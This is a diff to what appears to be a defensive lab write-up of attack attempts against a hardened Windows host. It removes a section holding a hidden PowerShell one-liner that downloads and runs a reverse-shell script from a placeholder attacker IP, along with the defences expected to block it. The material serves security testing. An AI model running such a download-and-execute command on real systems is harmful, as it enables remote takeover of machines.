@@ -177,21 +177,7 @@ This demonstrates the human improvement since previous scenarios.
 
 ---
 
-# 🟥 3.6 Attempt 6 — Try App-Based Attack Chain (PowerShell Reverse Shell)
-
-```bash
-powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/shell.ps1')"
-```
-
-### Expected:
-❌ ScriptBlock (4104) blocked by AMSI  
-❌ Defender quarantines payload  
-❌ Outbound HTTP blocked by firewall  
-❌ SIEM detects suspicious activity  
-
----
-
-# 🟥 3.7 Attempt 7 — Try Zero-Interaction Exploits
+# 🟥 3.6 Attempt 7 — Try Zero-Interaction Exploits
 
 Attacker tries generic exploit scanning:
 
